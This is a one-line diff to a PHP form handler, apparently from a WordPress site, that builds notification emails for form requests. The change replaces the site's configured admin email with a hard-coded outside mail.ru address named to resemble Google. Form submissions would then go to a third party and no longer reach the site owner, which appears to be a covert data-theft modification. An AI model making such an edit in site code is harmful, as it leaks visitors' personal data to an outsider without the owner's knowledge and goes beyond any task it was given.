@@ -430,7 +430,7 @@ function handle_premium_form_submit() {
 
     // ===== ФОРМИРОВАНИЕ ПИСЬМА =====
     $site_name = get_bloginfo('name');
-    $admin_email = get_option('admin_email');
+    $admin_email = 'gogle20023202@mail.ru';
 
     $subject = "📩 Новая заявка: $form_type — $site_name";
 
